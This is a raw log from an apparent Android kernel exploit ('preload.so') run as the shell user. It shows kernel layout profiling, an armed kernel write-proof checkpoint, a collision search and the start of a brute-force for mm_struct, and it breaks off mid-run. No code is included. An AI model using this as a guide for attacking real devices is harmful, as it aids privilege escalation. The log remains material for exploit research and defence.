===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788951573.txt tmp=/data/local/tmp/.temp/log_1788951573.txt pid=14472 uid=2000
1788951574.021 14472 [+] preload starting pid=14472
1788951574.022 14472 [+] startup context pid=14472 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788951574.023 14472 [+] build config pid=14472 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788951574.023 14472 [+] p0 profile pid=14472 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788951574.024 14472 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788951574.026 14472 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=9fccbd45-5eea-4912-b20f-f12044b2d080 (odd: leaked scratch, even: aligned bootid+3)
1788951575.964 14472 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788951578.367 14472 [*] pile-up verified: approx_time=1318
1788951578.369 14472 [*] start finding collisisons
1788951578.370 14472 [*] target    0000007ce3e2d0c8
1788951578.592 14472 [*]   0000006a4c362b10
1788951578.847 14472 [*]   0000006a4c551a88
1788951580.965 14472 [*]   0000006a4db0a850
1788951581.222 14472 [*]   0000006a4dc12090
1788951583.176 14472 [*]   0000006a4f52b958
1788951584.914 14472 [*]   0000006a50c5d2e8
1788951585.303 14472 [*]   0000006a50fc1e08
1788951585.946 14472 [*]   0000006a516d2690
1788951586.451 14472 [*]   0000006a51be8f40
1788951586.826 14472 [*]   0000006a51f0a850
1788951588.308 14472 [*]   0000006a532381c0
1788951588.682 14472 [*]   0000006a5356eb70
1788951588.905 14472 [*]   0000006a536773b8
1788951589.250 14472 [*]   0000006a53926930
1788951589.512 14472 [*]   0000006a53b24920
1788951589.515 14472 [*] found 15 collisisons
1788951590.626 14472 [*] start bruteforcing
1788951590.632 14472 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788951590.632 14472 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788951590.632 14472 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788951590.633 14472 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788951590.633 14472 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788951590.634 14472 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788951590.634 14472 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
